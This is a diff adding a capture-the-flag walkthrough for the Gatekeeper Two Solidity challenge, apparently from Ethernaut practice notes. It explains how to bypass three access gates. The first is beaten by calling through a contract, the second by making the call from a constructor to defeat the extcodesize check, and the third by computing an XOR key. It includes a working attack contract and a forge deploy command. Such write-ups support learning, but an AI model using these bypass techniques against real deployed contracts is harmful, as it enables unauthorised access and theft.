@@ -422,3 +422,42 @@ cast storage $LEVEL_ADDRESS 0 --rpc-url $RPC_URL
 if the value is 0 means it was updated successfully
 
 8. submit the instance, u're done.
+
+## level14 - Gatekeeper Two
+
+1. to complete this level we need to satisfy three conditions gateOne, gateTwo and gateThree.
+
+2. for gateOne msg.sender shud not be equal to tx.origin which can be easily achieved if we call the function thru a contract.
+
+3. for gateTwo extcodesize(caller()) shud be equal to zero for that we will write the code inside constructor as extcodesize() doesn't include code deployed at deployment time aka. written inside constructor.
+
+4. for gateThree we need to keep this property of XOR in mind which is if A^B=C then A^C=B. so we can get the value of \_gatekey using this
+
+```solidity
+bytes8 _gateKey = bytes8(uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^ type(uint64).max);
+```
+
+5. Now we will deploy our contract
+
+```solidity
+// SPDX-license-Identifier: MIT
+
+pragma solidity ^0.8.0;
+
+import "../instances/Ilevel14.sol";
+
+contract AttackGatekeeperTwo {
+    constructor(GatekeeperTwo _addr) {
+        bytes8 _gateKey = bytes8(uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^ type(uint64).max);
+        _addr.enter(_gateKey);
+    }
+}
+```
+
+```
+forge create src/level14.sol:AttackGatekeeperTwo --constructor-args $LEVEL_ADDRESS --rpc-url $RPC_URL --private-key $PKEY
+```
+
+6. as the function is called inside constructor we don't need to make any other function call.
+
+7. submit the instance, u're done.
